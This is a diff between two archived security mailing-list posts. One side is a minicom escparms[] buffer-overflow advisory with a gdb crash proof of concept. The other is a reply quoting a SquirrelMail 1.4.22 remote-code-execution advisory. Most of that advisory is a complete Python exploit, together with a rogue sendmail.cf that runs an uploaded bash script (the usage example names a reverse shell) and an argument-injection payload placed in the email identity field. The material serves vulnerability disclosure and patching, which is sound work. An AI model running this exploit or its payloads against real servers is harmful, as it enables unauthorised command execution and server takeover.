@@ -1,216 +1,449 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/18/5
-Message-ID: <20170418132255.GA4877@openwall.com>
-Date: Tue, 18 Apr 2017 15:22:55 +0200
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/19/7
+Message-ID: <CADSYzssu2X06FJDH3u0sQoAhPRuOBpEonncGMws4nW7RR7KNNw@mail.gmail.com>
+Date: Wed, 19 Apr 2017 11:37:13 -0300
+From: Dawid Golunski <dawid@...alhackers.com>
 To: oss-security@...ts.openwall.com
-Cc: Adam Lackorzynski <adam@...inf.tu-dresden.de>
-Subject: CVE-2017-7467: minicom and prl-vzvncserver vt100.c escparms[] buffer overflow
+Subject: Re: CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Hi Filippo,
 
-This is to announce a vulnerability that has just been fixed in minicom
-2.7.1 released earlier today, and that had been found and fixed in
-derived code in prl-vzvncserver (a Virtuozzo 7 component) earlier this
-year.  minicom 2.7.1 is available for download at:
+I actually reported this vulnerability to the vendor at the beginning
+of this year.  I also got the following CVEID assigned for it in
+January: CVE-2017-5181.
+I was waiting on the vendor to patch the vulnerability since then
+before I publish the details.
 
-https://alioth.debian.org/projects/minicom/
+Has he got back to you?
 
-The main bug is that in minicom's vt100.c escparms[] is declared as:
+On Wed, Apr 19, 2017 at 10:14 AM, Filippo Cavallarin
+<filippo.cavallarin@...resegment.com> wrote:
+> Advisory ID:           SGMA17-001
+> Title:                 Squirrelmail Remote Code Execution
+> Product:               Squirrelmail
+> Version:               1.4.22 and probably prior
+> Vendor:                squirrelmail.org
+> Type:                  Command Injection
+> Risk level:            4 / 5
+> Credit:                filippo.cavallarin@...resegment.com
+> CVE:                   CVE-2017-7692
+> Vendor notification:   2017-04-04
+> Vendor fix:            N/A
+> Public disclosure:     2017-04-19
+>
+>
+>
+>
+> DETAILS
+>
+> Squirrelmail version 1.4.22 (and probably prior) is vulnerable to a remote code execution vulnerability because
+> it fails to sanitize a string before passing it to a popen call. It's possible to exploit this vulnerability to
+> execute arbitrary shell commands on the remote server.
+>
+> The problem is in Deliver_SendMail.class.php on initStream function that uses escapeshellcmd() to sanitize the
+> sendmail command before executing it. The use of escapeshellcmd() is not correct in this case since it don't
+> escapes whitespaces allowing the injection of arbitrary command parameters.
+>
+>       $this->sendmail_command = "$sendmail_path $this->sendmail_args -f$envelopefrom";
+>       $stream = popen(escapeshellcmd($this->sendmail_command), "w");
+>
+>
+> The $envelopefrom variable is controlled by the attacker, hence it's possible to trick sendmail to use an
+> attacker-provided configuration file that triggers the execution of an arbitrary command.
+>
+> In order to exploit this vulnerability the MTA in use must be sendmail and Squirrelmail must be configured
+> to use it as commandline (useSendmail directive of the config file set to true).
+> Also, the edit_identity directive of the config file must be bet to true, but this is the default configuration.
+>
+> To reproduce the issue follow these steps:
+>         1. Create a rogue sendmail.cf that triggers the execution of a /usr/bin/touch:
+>                 [...]
+>                 Mlocal,         P=/usr/bin/touch, F=lsDFMAw5:/|@...9S, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
+>                 T=DNS/RFC822/X-Unix,
+>                 A=X /tmp/executed
+>         2. Upload it as a mail attachment and get it's remote name (ex: lF51mGPJwdqzV3LEDlCdSVNpohzgF7sD)
+>         3. Go to Options -> Personal Informations and set the following payload as Email Address:
+>                 <aaa@....com -OQueueDirectory=/tmp  -C /var/local/squirrelmail/attach/lF51mGPJwdqzV3LEDlCdSVNpohzgF7sD>
+>         4. Send an email
+>         5. Verify the execution of the command with "ls /tmp/executed" on the remote server
+>
+>
+>
+>
+> PROOF OF CONCEPT
+>
+> The followig python script exploits this vulnerability to execute an attacker provided bash script on the remote server.
+>
+> BOF
+> #!/usr/bin/env python
+> # -*- coding: utf-8 -*-
+>
+> """
+>
+> SquirrelMail 1.4.22 Remote Code Execution (authenticated)
+> Exploit code for CVE-2017-7692
+> filippo.cavallarin@...resegment.com
+>
+> """
+>
+> from __future__ import unicode_literals
+> import sys
+> import os
+> import re
+> import requests
+>
+> reload(sys)
+> sys.setdefaultencoding('utf8')
+>
+>
+> SENDMAILCF="/tmp/squirrelmail1_4_22-sendmailcf-rce"
+> COMPOSE = "/src/compose.php"
+> INFOS = "/src/options.php?optpage=personal"
+> SQM_ATTACH_PATH = "/var/local/squirrelmail/attach/"
+> # must be enclosed in <> otherwise spaces will be removed ..
+> SENDER = "<px@...x.com -OQueueDirectory=/tmp  -C %s%s>"
+>
+>
+> SESSID = ""
+> BASEURL = ""
+>
+>
+> def attach(attachment):
+>   url = "%s%s" % (BASEURL, COMPOSE)
+>   token = get_csrf_token(url)
+>
+>   values = {
+>     "smtoken": token,
+>     "attach": "add"
+>   }
+>
+>   try:
+>     files = {'attachfile': open(attachment,'rb')}
+>     resp = requests.post(url, files=files, data=values, cookies={'SQMSESSID':SESSID})
+>     fname = re.search(r'att_local_name&quot;;s:[0-9]+:&quot;([a-zA-Z0-9]+)&quot;', resp.text)
+>     if not fname:
+>       print "\nError: unable to upload file %s" % attachment
+>     return fname.group(1)
+>
+>   except Exception as e:
+>     print "\nError: %s" % e
+>     sys.exit(1)
+>
+>
+> def send():
+>   url = "%s%s" % (BASEURL, COMPOSE)
+>   token = get_csrf_token(url)
+>
+>   values = {
+>     "smtoken": token,
+>     "send_to": "root",
+>     "send": "Send"
+>   }
+>
+>   try:
+>     resp = requests.post(url, data=values, cookies={'SQMSESSID':SESSID})
+>   except Exception as e:
+>     print "\nError: %s" % e
+>     sys.exit(1)
+>
+>
+> def set_identity(sender):
+>   url = "%s%s" % (BASEURL, INFOS)
+>   token = get_csrf_token(url)
+>   values = {
+>     "smtoken": token,
+>     "optpage": "personal",
+>     "optmode": "submit",
+>     "new_email_address": sender,
+>     "submit_personal": "Submit"
+>   }
+>
+>   try:
+>     requests.post(url, data=values, cookies={'SQMSESSID':SESSID})
+>   except Exception as e:
+>     print "\nError: %s" % e
+>     sys.exit(1)
+>
+>
+> def get_csrf_token(url):
+>   try:
+>     body = requests.get(url, cookies={'SQMSESSID':SESSID}).text
+>     inp = re.search(r'<input.*name="smtoken".*>', body, re.MULTILINE)
+>     token = re.search(r'value="([a-zA-Z0-9]+)"', inp.group(0))
+>     if token:
+>       return token.group(1)
+>   except Exception as e:
+>     pass
+>
+>   print "\nUnable to get CSRF token"
+>   sys.exit(1)
+>
+> def outw(s):
+>   sys.stdout.write(s)
+>   sys.stdout.flush()
+>
+> def main(argv):
+>   global BASEURL
+>   global SESSID
+>
+>   if len(argv) != 4:
+>     print (
+>         "SquirrelMail 1.4.22 Remote Code Execution (authenticated) - filippo.cavallarin@...resegment.com\n"
+>         "The target server must use sendmail and squirrelmail must be configured to use /usr/bin/sendmail\n"
+>         "Usage:\n"
+>         "  %s <url> <session_id> <script>\n"
+>         "      url: the url of squirrelmail\n"
+>         "      session_id: the value of SQMSESSID cookie\n"
+>         "      script: the path to the bash script to be executed on the target\n"
+>         "Example:\n"
+>         "  %s http:/example.com/squirrelmail/ l2rapvcovsui1on0b4i5boev24 reverseshell.sh"
+>       ) % (argv[0], argv[0])
+>
+>     sys.exit(1)
+>
+>   BASEURL = argv[1]
+>   SESSID = argv[2]
+>   script = argv[3]
+>
+>   outw("Uploading script ... ")
+>   script_fname = attach(script)
+>   print "ok"
+>
+>
+>   outw("Generating sendmail.cf ... ")
+>   try:
+>     script_path = "%s%s" % (SQM_ATTACH_PATH, script_fname)
+>     with open(SENDMAILCF, 'w') as f:
+>       f.write(SENDMAILCF_CONTENT % script_path)
+>   except Exception as e:
+>     print "\nError: %s" % e
+>     sys.exit(1)
+>   print "ok"
+>
+>   outw("Uploading sendmail.cf ... ")
+>   smc_fname = attach(SENDMAILCF)
+>   os.remove(SENDMAILCF)
+>   print "ok"
+>
+>   outw("Updating user options ... ")
+>   sender = SENDER % (SQM_ATTACH_PATH, smc_fname)
+>   set_identity(sender)
+>   print "ok"
+>
+>   outw("Checking identity field ... ")
+>   icheck = requests.get("%s%s" % (BASEURL, INFOS), cookies={'SQMSESSID':SESSID}).text
+>   if not smc_fname in icheck:
+>     print "\nError: unable to set identity field .. maybe squirrelmail is configured with edit_identity=false"
+>     sys.exit(1)
+>   print "ok"
+>
+>   outw("Executing script ... ")
+>   send()
+>   print "ok\n"
+>   sys.exit(0)
+>
+> SENDMAILCF_CONTENT = """
+> O DontBlameSendmail=,AssumeSafeChown,ForwardFileInGroupWritableDirPath,GroupWritableForwardFileSafe,GroupWritableIncludeFileSafe,IncludeFileInGroupWritableDirPath,DontWarnForwardFileInUnsafeDirPath,TrustStickyBit,NonRootSafeAddr,GroupWritableIncludeFile,GroupReadableDefaultAuthInfoFile
+> Kdequote dequote
+> Scanonify=3
+> R$@     $@ <@>
+> R$*     $: $1 <@>     mark addresses
+> R$* < $* > $* <@> $: $1 < $2 > $3     unmark <addr>
+> R@ $* <@>   $: @ $1       unmark @host:...
+> R$* [ IPv6 : $+ ] <@> $: $1 [ IPv6 : $2 ]   unmark IPv6 addr
+> R$* :: $* <@>   $: $1 :: $2     unmark node::addr
+> R:include: $* <@> $: :include: $1     unmark :include:...
+> R$* : $* [ $* ]   $: $1 : $2 [ $3 ] <@>   remark if leading colon
+> R$* : $* <@>    $: $2       strip colon if marked
+> R$* <@>     $: $1       unmark
+> R$* ;        $1       strip trailing semi
+> R$* < $+ :; > $*  $@ $2 :; <@>      catch <list:;>
+> R$* < $* ; >       $1 < $2 >      bogus bracketed semi
+> R$@     $@ :; <@>
+> R$*     $: < $1 >     housekeeping <>
+> R$+ < $* >       < $2 >     strip excess on left
+> R< $* > $+       < $1 >     strip excess on right
+> R<>     $@ < @ >      MAIL FROM:<> case
+> R< $+ >     $: $1       remove housekeeping <>
+> R@ $+ , $+    $2
+> R@ [ $* ] : $+    $2
+> R@ $+ : $+    $2
+> R $+ : $* ; @ $+  $@ $>Canonify2 $1 : $2 ; < @ $3 > list syntax
+> R $+ : $* ;   $@ $1 : $2;     list syntax
+> R$+ @ $+    $: $1 < @ $2 >      focus on domain
+> R$+ < $+ @ $+ >   $1 $2 < @ $3 >      move gaze right
+> R$+ < @ $+ >    $@ $>Canonify2 $1 < @ $2 >  already canonical
+> R$- ! $+    $@ $>Canonify2 $2 < @ $1 .UUCP >  resolve uucp names
+> R$+ . $- ! $+   $@ $>Canonify2 $3 < @ $1 . $2 >   domain uucps
+> R$+ ! $+    $@ $>Canonify2 $2 < @ $1 .UUCP >  uucp subdomains
+> R$* %% $*   $1 @ $2       First make them all @s.
+> R$* @ $* @ $*   $1 %% $2 @ $3     Undo all but the last.
+> R$* @ $*    $@ $>Canonify2 $1 < @ $2 >  Insert < > and finish
+> R$*     $@ $>Canonify2 $1
+> SCanonify2=96
+> R$* < @ localhost > $*    $: $1 < @ $j . > $2   no domain at all
+> R$* < @ localhost . $m > $* $: $1 < @ $j . > $2   local domain
+> R$* < @ localhost . UUCP > $* $: $1 < @ $j . > $2   .UUCP domain
+> R$* < @ [ $+ ] > $*   $: $1 < @@ [ $2 ] > $3    mark [addr]
+> R$* < @@ $=w > $*   $: $1 < @ $j . > $3   self-literal
+> R$* < @@ $+ > $*    $@ $1 < @ $2 > $3   canon IP addr
+> Sfinal=4
+> R$+ :; <@>    $@ $1 :       handle <list:;>
+> R$* <@>     $@        handle <> and list:;
+> R$* < @ $+ . > $* $1 < @ $2 > $3
+> R$* < @ *LOCAL* > $*  $1 < @ $j > $2
+> R$* < $+ > $*   $1 $2 $3      defocus
+> R@ $+ : @ $+ : $+ @ $1 , @ $2 : $3    <route-addr> canonical
+> R@ $*     $@ @ $1       ... and exit
+> R$+ @ $- . UUCP   $2!$1       u@...UCP => h!u
+> R$+ %% $=w @ $=w    $1 @ $2       u%%host@...t => u@...t
+> SRecurse=97
+> R$*     $: $>canonify $1
+> R$*     $@ $>parse $1
+> Sparse=0
+> R$*     $: $>Parse0 $1    initial parsing
+> R<@>      $#local $: <@>    special case error msgs
+> R$*     $: $>ParseLocal $1  handle local hacks
+> R$*     $: $>Parse1 $1    final parsing
+> SParse0
+> R<@>      $@ <@>      special case error msgs
+> R$* : $* ; <@>    $#error $@ 5.1.3 $: "553 List:; syntax illegal for recipient addresses"
+> R@ <@ $* >    < @ $1 >    catch "@@host" bogosity
+> R<@ $+>     $#error $@ 5.1.3 $: "553 User address required"
+> R$+ <@>     $#error $@ 5.1.3 $: "553 Hostname required"
+> R$*     $: <> $1
+> R<> $* < @ [ $* ] : $+ > $* $1 < @ [ $2 ] : $3 > $4
+> R<> $* < @ [ $* ] , $+ > $* $1 < @ [ $2 ] , $3 > $4
+> R<> $* < @ [ $* ] $+ > $* $#error $@ 5.1.2 $: "553 Invalid address"
+> R<> $* < @ [ $+ ] > $*    $1 < @ [ $2 ] > $3
+> R<> $* <$* : $* > $*  $#error $@ 5.1.3 $: "553 Colon illegal in host name part"
+> R<> $*      $1
+> R$* < @ . $* > $* $#error $@ 5.1.2 $: "553 Invalid host name"
+> R$* < @ $* .. $* > $* $#error $@ 5.1.2 $: "553 Invalid host name"
+> R$* < @ $* @ > $* $#error $@ 5.1.2 $: "553 Invalid route address"
+> R$* @ $* < @ $* > $*  $#error $@ 5.1.3 $: "553 Invalid route address"
+> R$* , $~O $*    $#error $@ 5.1.3 $: "553 Invalid route address"
+> R$* < @ > $*    $@ $>Parse0 $>canonify $1 user@ => user
+> R< @ $=w . > : $* $@ $>Parse0 $>canonify $2 @here:... -> ...
+> R$- < @ $=w . >   $: $(dequote $1 $) < @ $2 . > dequote "foo"@here
+> R< @ $+ >   $#error $@ 5.1.3 $: "553 User address required"
+> R$* $=O $* < @ $=w . >  $@ $>Parse0 $>canonify $1 $2 $3 ...@...e -> ...
+> R$-       $: $(dequote $1 $) < @ *LOCAL* >  dequote "foo"
+> R< @ *LOCAL* >    $#error $@ 5.1.3 $: "553 User address required"
+> R$* $=O $* < @ *LOCAL* >
+>       $@ $>Parse0 $>canonify $1 $2 $3 ...@...CAL* -> ...
+> R$* < @ *LOCAL* > $: $1
+> SParse1
+> R$* < @ [ $+ ] > $* $: $>ParseLocal $1 < @ [ $2 ] > $3  numeric internet spec
+> R$* < @ [ $+ ] > $* $: $1 < @ [ $2 ] : $S > $3  Add smart host to path
+> R$* < @ [ $+ ] : > $*   $#esmtp $@ [$2] $: $1 < @ [$2] > $3 no smarthost: send
+> R$* < @ [ $+ ] : $- : $*> $*  $#$3 $@ $4 $: $1 < @ [$2] > $5  smarthost with mailer
+> R$* < @ [ $+ ] : $+ > $*  $#esmtp $@ $3 $: $1 < @ [$2] > $4 smarthost without mailer
+> R$=L < @ $=w . >  $#local $: @ $1     special local names
+> R$+ < @ $=w . >   $#local $: $1     regular local name
+> R$* < @ $* > $*   $: $>MailerToTriple < $S > $1 < @ $2 > $3 glue on smarthost name
+> R$* < @$* > $*    $#esmtp $@ $2 $: $1 < @ $2 > $3 user@...t.domain
+> R$=L      $#local $: @ $1   special local names
+> R$+     $#local $: $1     regular local names
+> SLocal_localaddr
+> Slocaladdr=5
+> R$+     $: $1 $| $>"Local_localaddr" $1
+> R$+ $| $#ok   $@ $1     no change
+> R$+ $| $#$*   $#$2
+> R$+ $| $*   $: $1
+> R$+ + *     $#local $@ $&h $: $1
+> R$+ + $*    $#local $@ + $2 $: $1 + *
+> R$+     $: <> $1
+> R< > $+     $: < > < $1 <> $&h >    nope, restore +detail
+> R< > < $+ <> + $* > $: < > < $1 + $2 >    check whether +detail
+> R< > < $+ <> $* > $: < > < $1 >     else discard
+> R< > < $+ + $* > $*    < > < $1 > + $2 $3   find the user part
+> R< > < $+ > + $*  $#local $@ $2 $: @ $1   strip the extra +
+> R< > < $+ >   $@ $1       no +detail
+> R$+     $: $1 <> $&h      add +detail back in
+> R$+ <> + $*   $: $1 + $2      check whether +detail
+> R$+ <> $*   $: $1       else discard
+> R< local : $* > $*  $: $>MailerToTriple < local : $1 > $2 no host extension
+> R< error : $* > $*  $: $>MailerToTriple < error : $1 > $2 no host extension
+> R< $~[ : $+ > $+  $: $>MailerToTriple < $1 : $2 > $3 < @ $2 >
+> R< $+ > $+    $@ $>MailerToTriple < $1 > $2 < @ $1 >
+> SParseLocal=98
+> SEnvFromL
+> R<@>      $n      errors to mailer-daemon
+> R@ <@ $*>   $n      temporarily bypass Sun bogosity
+> R$+     $: $>AddDomain $1 add local domain if needed
+> R$*     $: $>MasqEnv $1   do masquerading
+> SEnvToL
+> R$+ < @ $* >    $: $1     strip host part
+> R$+ + $*    $: < $&{addr_type} > $1 + $2  mark with addr type
+> R<e s> $+ + $*    $: $1     remove +detail for sender
+> R< $* > $+    $: $2     else remove mark
+> SHdrFromL
+> R<@>      $n      errors to mailer-daemon
+> R@ <@ $*>   $n      temporarily bypass Sun bogosity
+> R$+     $: $>AddDomain $1 add local domain if needed
+> R$*     $: $>MasqHdr $1   do masquerading
+> SHdrToL
+> R$+     $: $>AddDomain $1 add local domain if needed
+> R$*     $: $>MasqHdr $1   do all-masquerading
+> SAddDomain
+> R$* < @ $* > $*   $@ $1 < @ $2 > $3 already fully qualified
+> R$+     $@ $1 < @ *LOCAL* > add local qualification
+> Mlocal,   P=/bin/bash, F=lsDFMAw5:/|@...9S, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
+>     T=DNS/RFC822/X-Unix,
+>     A=X %s
+> Mprog,    P=/bin/sh, F=lsDFMoqeu9, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL, D=$z:/,
+>     T=X-Unix/X-Unix/X-Unix,
+>     A=sh -c $u
+>
+> """
+>
+> if __name__ == '__main__':
+>   main(sys.argv)
+>
+> EOF
+>
+>
+>
+>
+> SOLUTION
+>
+> Since the vendor did not respond to our mails, no official fix is available.
+> However, the following unofficial patch can be used to fix this vulnerability.
+>
+> BOF
+> diff -ruN squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.class.php squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_SendMail.class.php
+> --- squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.class.php  2011-01-06 02:44:03.000000000 +0000
+> +++ squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_SendMail.class.php  2017-04-18 11:42:26.505181944 +0000
+> @@ -93,9 +93,9 @@
+>          $envelopefrom = trim($from->mailbox.'@...from->host);
+>          $envelopefrom = str_replace(array("\0","\n"),array('',''),$envelopefrom);
+>          // save executed command for future reference
+> -        $this->sendmail_command = "$sendmail_path $this->sendmail_args -f$envelopefrom";
+> +        $this->sendmail_command = escapeshellcmd("$sendmail_path $this->sendmail_args -f") . escapeshellarg($envelopefrom);
+>          // open process handle for writing
+> -        $stream = popen(escapeshellcmd($this->sendmail_command), "w");
+> +        $stream = popen($this->sendmail_command, "w");
+>          return $stream;
+>      }
+> EOF
+>
+>
+>
+>
+> REFERENCES
+>
+> https://squirrelmail.org/
+> https://www.wearesegment.com/research/Squirrelmail-Remote-Code-Execution.html
+>
+>
+>
 
-static void (*vt_keyb)(int, int);/* Gets called for NORMAL/APPL switch. */
-static void (*termout)(const char *, int);/* Gets called to output a string. */
 
-static int escparms[8];         /* Cumulated escape sequence. */
-static int ptr;                 /* Index into escparms array. */
-static long vt_tabs[5];         /* Tab stops for max. 32*5 = 160 columns. */
 
-but is filled as:
-
-  /* See if a number follows */
-  if (c >= '0' && c <= '9') {
-    escparms[ptr] = 10*escparms[ptr] + c - '0';
-    return;
-  }
-  /* Separation between numbers ? */
-  if (c == ';') {
-    if (ptr < 15)
-      ptr++;
-    return;
-  }
-
-Notice the 8 vs. 15 (meaning 16 elements) discrepancy.
-
-At least in the Fedora 23 package of minicom, this lets me adjust or
-replace the termout function pointer.  If the variables were put in .bss
-in the other order (perhaps by a different compiler), then ptr could be
-overwritten, which is likely also exploitable.
-
-Here's how to reproduce:
-
-mkfifo fifo
-gdb /usr/bin/minicom
-
-(gdb) r -oD fifo
-Starting program: /usr/bin/minicom -oD fifo
-
-On another terminal:
-
-echo -ne "\033[0;0;0;0;0;0;0;0;00000000000000000000001094795585;00000000000000000000001094795585" > fifo
-
-Then press Enter in minicom, and:
-
-Program received signal SIGSEGV, Segmentation fault.
-                                                    0x000055555555d31f in v_termout ()
-(gdb) disass
-Dump of assembler code for function v_termout:
-[...]
-   0x000055555555d316 <+70>:	mov    %r12d,%esi
-   0x000055555555d319 <+73>:	mov    %rbp,%rdi
-   0x000055555555d31c <+76>:	pop    %rbp
-   0x000055555555d31d <+77>:	pop    %r12
-=> 0x000055555555d31f <+79>:	jmpq   *0x225ebb(%rip)        # 0x5555557831e0
-   0x000055555555d325 <+85>:	nopl   (%rax)
-   0x000055555555d328 <+88>:	mov    $0xa,%edi
-   0x000055555555d32d <+93>:	callq  0x55555555be70 <vt_out>
-   0x000055555555d332 <+98>:	jmp    0x55555555d304 <v_termout+52>
-End of assembler dump.
-(gdb) x/2x 0x5555557831e0
-0x5555557831e0:	0x41414141	0x41414141
-
-As you can see, I am able to control the address to branch to.  Moreover,
-on typical 64-bit little-endian there's partial ASLR (PIE) bypass due to
-ability to keep most significant 32 bits of the function pointer intact.
-
-Thus, this bug likely allows for remote code execution.
-
-In the PoC above, the decimal numbers (corresponding to the 32-bit
-pointer halves) include leading zeroes (for exactly 32 digits in each
-number) in order to completely shift out, one bit at a time, the
-previous contents of the v_termout pointer.  This works due to the
-multiplier 10 including 2 as a factor.
-
-The fix included in minicom 2.7.1 is simply:
-
--	if (ptr < 15)
-+	if (ptr < 7)
-
-(I guess a later code revision could introduce a macro for this array's
-size, or determine the array size by dividing two sizeof's.)
-
-I'd like to thank Adam Lackorzynski, CC'ed here, for producing the new
-minicom release promptly and in time for this announcement.
-
-I first found the bug during Openwall's security audit of the
-Virtuozzo 7 product, which contains derived downstream code in its
-prl-vzvncserver component.  The corresponding Virtuozzo 7 fix is:
-
-https://src.openvz.org/projects/OVZ/repos/prl-vzvncserver/commits/6d95404e75b98f36b1cc85ee23df99dcf06ca13f
-
-We would like to thank the Virtuozzo company for funding the effort.
-
-In prl-vzvncserver, the escparms[] overflow wasn't obviously exploitable
-due to different nearby variables:
-
-static int esc_s = 0;
-
-#define ESC 27
-
-static unsigned char vt_fg;             /* Standard foreground color. */
-static unsigned char vt_bg;             /* Standard background color. */
-
-static int escparms[8];         /* Cumulated escape sequence. */
-static int ptr;                 /* Index into escparms array. */
-
-static short newy1 = 0;         /* Current size of scrolling region. */
-static short newy2 = 23;
-
-but it also was clearly triggerable, as seen in an ASan-enabled build:
-
-==45204== ERROR: AddressSanitizer: global-buffer-overflow on address 0x0000006164a0 at pc 0x40c922 bp 0x7fffffffa700 sp 0x7fffffffa6f0
-READ of size 4 at 0x0000006164a0 thread T0
-    #0 0x40c921 (/home/user/prl-vzvncserver-debug/prl_vzvncserver_app+0x40c921)
-    #1 0x403e6d (/home/user/prl-vzvncserver-debug/prl_vzvncserver_app+0x403e6d)
-    #2 0x7ffff43c8b14 (/usr/lib64/libc-2.17.so+0x21b14)
-    #3 0x4043f4 (/home/user/prl-vzvncserver-debug/prl_vzvncserver_app+0x4043f4)
-0x0000006164a0 is located 32 bytes to the left of global variable 'vt_bg (vt100.c)' (0x6164c0) of size 1
-  'vt_bg (vt100.c)' is ascii string ''
-0x0000006164a0 is located 0 bytes to the right of global variable 'escparms (vt100.c)' (0x616480) of size 32
-  'escparms (vt100.c)' is ascii string ''
-
-In VzLinux's build of prl-vzvncserver as of when this issue was
-discovered, the following variables happened to follow escparms[] and
-were close enough: esc_s, vt_fg, vt_bg.  Changing esc_s is benign - for
-valid values, it could as well be done directly (with the proper
-escapes), and the invalid values are unused.  Changing vt_fg or/and
-vt_bg might have some other ill effects, although we'd expect only out
-of bound reads, so at worst crashes.  That's because prl-vzvncserver's
-console.c defines only a 16 entry colourMap.  In LibVNCServer, that
-table appears to be used to initialize related tables with bigger
-elements, but those inherit the size of 16.  Out of bound reads from
-those tables in LibVNCServer might be triggered through having the color
-numbers above 15 written to the frameBuffer (which console.c will
-happily do once we overwrote vt_fg or/and vt_bg with such values) and
-then accessed via certain parts of LibVNCServer's code.  We did not
-actually test for these potential ill effects of overwriting vt_fg
-or/and vt_bg.  Regardless, it is inappropriate and unsafe to rely on a
-specific memory layout of a binary build, and of course the issue was
-promptly fixed.
-
-Some other issues inherited from minicom likely were exploitable in
-prl-vzvncserver - namely, incomplete validation of cursor coordinates
-in vt100.c.  In minicom itself, there's further validation in mc_*()
-functions.  In prl-vzvncserver, there was no such validation in its
-equivalent functions - and there are now more commits in the above
-repository fixing those issues (besides the commit referenced above).
-Specifically, a likely exploitable code path was triggered e.g. with:
-
-echo -ne "\033[2147483648B"
-
-but this appears to do little against minicom.(*)  In fact, I ran a
-rather extensive set of escape sequences against minicom, which
-triggered no other crashes besides the escparms[] buffer overflow
-reported here.
-
-(*) Formally speaking, the code is also triggering C's undefined
-behavior when it allows signed integers to overflow.  In practice, so
-far compilers only make use of compile-time detectable UB of this kind
-(such as to drop the UB-triggering code as an optimization, since they
-are allowed to).
-
-One change minicom could make later is switch to using unsigned types
-for escparms and coordinates.  But we'd need to carefully review all
-uses for that, in case any place relies on a value temporarily becoming
-negative and on checking for that.
-
-prl-vzvncserver was using int and switched to "unsigned short".
-This may be weird, but it actually helps avoid integer overflows in
-calculations as inputs to calculations become more limited whereas
-intermediate results get promoted to int.
-
-Besides minicom and prl-vzvncserver, I managed to identify just one
-other project reusing this code (and also containing the issues), but
-it's obscure (likely unused):
-
-https://github.com/sigflup/vt100
-
-I did not bother notifying this project in advance (putting the
-information at unjustified risk), but I intend to notify it now.
-
-For those into CVEs: CVE-2017-7467 is only for the escparms[] buffer
-overflow (in all projects reusing this code), not for other issues
-casually mentioned in here (even if some of them had higher impact on
-prl-vzvncserver).  Those other issues have no CVE IDs.
-
-Timeline:
-
-20161228 - bug found in prl-vzvncserver
-20161229 - report to Virtuozzo
-20170109 - fix committed in Virtuozzo (became part of an update later)
-20170407 - report to minicom
-20170408 - initial heads-up and CVE request via distros@vs, no detail
-20170411 - detail shared with distros@vs
-20170418 - fixed minicom release, public disclosure
-
-Alexander
+-- 
+Regards,
+Dawid Golunski
+https://legalhackers.com
+t: @dawid_golunski
